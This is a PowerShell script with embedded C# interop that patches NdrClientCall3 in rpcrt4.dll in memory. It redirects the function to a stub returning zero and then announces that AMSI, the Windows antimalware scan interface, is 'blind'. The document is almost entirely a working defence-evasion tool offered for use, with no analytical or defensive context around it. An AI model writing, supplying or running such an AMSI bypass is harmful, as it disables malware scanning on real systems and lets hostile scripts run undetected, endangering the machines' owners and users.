Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Mem {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
}
"@

# Constants
$PAGE_EXECUTE_READWRITE = 0x40
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PATCH_SIZE = 12

# Allocate trampoline: mov eax, 0; ret
$size = [UIntPtr]::op_Explicit(0x1000)
$trampoline = [Mem]::VirtualAlloc([IntPtr]::Zero, $size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)

# Exit if trampoline allocation failed
if ($trampoline -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to allocate trampoline."
    return
}

# Write hook: mov eax, 0; ret
$hook = [byte[]](0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($hook, 0, $trampoline, $hook.Length)

# Flush instruction cache
$len = [UIntPtr]::op_Explicit($hook.Length)
[Mem]::FlushInstructionCache([Mem]::GetCurrentProcess(), $trampoline, $len) | Out-Null

# Get function address
$lib = [Mem]::LoadLibrary("rpcrt4.dll")
$func = [Mem]::GetProcAddress($lib, "NdrClientCall3")
if ($func -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to locate NdrClientCall3."
    return
}

# Unprotect target memory
$oldProtect = 0
[Mem]::VirtualProtect($func, [UIntPtr]::op_Explicit($PATCH_SIZE), $PAGE_EXECUTE_READWRITE, [ref]$oldProtect) | Out-Null

# Write patch: mov rax, trampoline; jmp rax
$trampAddr = $trampoline.ToInt64()
$patch = [byte[]](0x48, 0xB8) + [BitConverter]::GetBytes($trampAddr) + [byte[]](0xFF, 0xE0)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $func, $patch.Length)

Write-Host "[+] NdrClientCall3 patched (CFG-safe trampoline). AMSI blind now."
